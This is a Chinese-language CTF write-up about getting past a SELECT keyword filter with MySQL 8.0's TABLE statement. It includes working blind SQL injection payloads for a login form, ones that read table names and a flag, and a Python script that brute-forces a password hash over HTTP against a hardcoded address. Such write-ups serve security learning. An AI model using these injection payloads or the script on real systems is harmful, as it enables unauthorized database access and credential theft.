---
title: 绕过Select过滤 By Mysql 8.0 新特性
date: December 6th 2020
tags: [SQL注入, MySQL, Bypass, CTF]
summary: 通过嘶吼 CTF 赛题介绍利用 MySQL 8.0 新增的 TABLE 语句替代 SELECT，在关键字被过滤场景下实现 SQL 注入的技巧。
---

# 绕过Select过滤 By Mysql 8.0 新特性

## 前言

周末剩余了一点时间做了一道嘶吼CTF的题，刚用sql注入跑出来密码的时候以为这道题就结束了，没想到才刚刚开始。于是卡在了绕过SELECT那个点，最终用到了一个Mysql8.0的新特性，可以用来绕过select过滤的漏洞环境。简单整理了一下。

## Select被过滤了

遇到SELECT被过去的情况下，一般我的思路是这样的：

1. 表内注入
2. 堆叠注入
3. handler注入
4. load_file直接读文件
5. 根据题目环境特性针对性的绕过(大小写、双写等)

但是今天遇到的这道题把2、3、4的关键函数都过滤了，没有办法，只能寻找新的思路。我在看了version之后也尝试过去寻找Mysql8的新特性，没找到相关内容。最后在队友的提示下才记起来P神圈子里有一篇文章讲到了Mysql8下的新利用。这篇文章也算是对这个知识点的笔记(以后遇到新知识还是要好好做记录)

## MYSQL8的新特性

### TABLE Statement

```sql
TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]]
```

文档参考：[https://dev.mysql.com/doc/refman/8.0/en/table.html](https://dev.mysql.com/doc/refman/8.0/en/table.html)  
这条命令的功能跟`SELECT * FROM xxx`是一样的，查询一个表里面的所有内容，返回的也就是“表数据”。并且支持`ORDER BY`、`TABLE`、`LIMIT`三种限定符。

![-w695](https://i.imgur.com/5S6bjaB.jpg)

### VALUES Statement

```sql
VALUES row_constructor_list [ORDER BY column_designator] [LIMIT BY number]

row_constructor_list:
    ROW(value_list)[, ROW(value_list)][, ...]

value_list:
    value[, value][, ...]

column_designator:
    column_index
```

文档参考：[https://dev.mysql.com/doc/refman/8.0/en/values.html](https://dev.mysql.com/doc/refman/8.0/en/values.html)  
这个语句可以把一组一个或多个行作为表展示出来，返回的也是一个表数据。这里的ROW()返回的是一个行数据，VALUES就是将这样的行数据增加上字段整理为一个表，然后展示。

![-w624](https://i.imgur.com/IDdkLpu.jpg)

由于TABLE命令和VALUES返回的都是表数据，它们所返回的数据可以通过`UNION`语句联合起来。

![-w800](https://i.imgur.com/Yd7e5u4.jpg)

实际上这个VALUES语句跟后面我们要说的绕过SELECT没太大的关系，但可以通过这个语句了解一下行数据与表数据。

### 绕过SELECT过滤

- 使用union联合查询获取表中的所有内容

因为TABLE返回的是表数据，可以与SELECT所查询出来的数据使用UNION联合查询出结果。但是这样的方式存在一定的限制，两个查询的表中字段数必须要一致。

```sql
SELECT * FROM user UNION TABLE news;
```

![-w707](https://i.imgur.com/46xLIb4.jpg)

- 盲注查询其他任意表中的内容

那如果我们要查询字段数不一样的表该怎么办？ 这时候可以用盲注来进行猜测。猜测过程其实跟无列名注入很像。具体过程如图：

![-w786](https://i.imgur.com/6PvKmYj.jpg)

OK，有了上面的知识前提下，解题的思路就清晰了。详细记录了一下题目的解题过程如下。

## 嘶吼CTF - ezsql

在用户名处发现盲注：

```plain
username=admin'and(1=1)and'1&password=
1=1
<script>alert("password error!");history.go(-1);</script>
1=2
<script>alert("username error!");history.go(-1);</script>

# 这样也可以
username=admin'and(1=1)#&password=
```

但是存在一定的过滤：

![-w552](https://i.imgur.com/MuAKJ5d.jpg)

比较重要的是把SELECT过滤了，所以我只尝试读出了一些基本信息与password。

```plain
version() : 8.0.22-0ubuntu0.20.04.2
database() : ctf
```

盲注脚本（我发现挂代理的时候会容易被ban，可以用vps来跑）：

```python
import requests
import time

burp0_headers = {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.67 Safari/537.36"}
url = "http://139.129.98.9:30003/login.php" # 漏洞地址
key = "password" # 关键字

# length = 32

for i in range(1, 300):
    burp0_data = {"username": "admin'and(length(password)={})and'1".format(i), "password": ''}
    print(burp0_data)
    response = requests.post(url, headers=burp0_headers, data=burp0_data)
    text = response.content.decode("utf-8", "ignore")
    if text.find(key) != -1: # 有关键字
        print("Length", i)
        length = i
        break
    time.sleep(1)

result = ""
for j in range(1, length + 1):
    for i in range(32, 128):
        burp0_data = {"username": "admin'and(ascii(substr(password,{},1))={})and'1".format(j,i), "password": ''}
        print(burp0_data)
        response = requests.post(url, headers=burp0_headers, data=burp0_data)
        text = response.content.decode("utf-8", "ignore")
        if text.find(key) != -1:
            result = result + chr(i)
            print(result)
            break
        time.sleep(1)
```

读出来的password：b4bc4c343ed120df3bff56d586e6d617  
md5查询的结果为：gml666  
登录之后发现并没有flag，所以还是需要看一下有没有其他的思路。尝试过的思路如下：

1. 读文件 => load_file被过滤
2. Mysql8 TABLE & VALUE新特性 踩坑1：不知道flag的表名是什么 =>`1. 盲猜flag表中的数据=>flag、f1ag、f14g都不行。
2. 把数据库information里面的表盲注跑一遍`

通过2.2的方式可以跑出ctf库中的表名，因为无法使用`WHERE`条件语句，这里通过使用`ORDER BY`排序和`OFFSET`限制可以比较快的确定ctf库的数据位置(可以本地搭一个Mysql8来进行测试)。表名应该不是很长，我就直接手动跑了。这里有一个小坑：就是当获取表名的时候，前面几位都是取盲注变化时的前一个值，最后一位则是要取变化时的那一个值。这是因为，当两个数据相等时，就会接着对比下一个字段值了。

```plain
# 跑表名的payload
username=admin'and((TABLE%09information_schema.tables%09ORDER%09BY%09TABLE_SCHEMA%09LIMIT%091%09OFFSET%090)>('def','ctf','§1§',1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1))#&password=gml666

# 跑出的表名
admin
f11114g
```

![](https://i.imgur.com/4j29Mbn.png)

直接猜测`f11114g`表里面只有一个flag字段，继续盲注发现在第二条数据里面是flag。盲注脚本不好写，就直接手动跑了：

```plain
# 跑flag的payload：
username=admin'and((TABLE%09f11114g%09LIMIT%091)>('a'))#&password=gml666

# 跑出来的flag(需要从大写转为小写)：
flag{6a55e234-1ed0-455c-bbf3-6df6ddce9a57}

# 最终语句：
username=admin'and((TABLE%09f11114g%09LIMIT%091%09OFFSET%091)>('FLAG{6A55E234-1ED0-455C-BBF3-6DF6DDCE9A57}§1§'))#&password=gml666
```

![](https://i.imgur.com/mD0n1WU.png)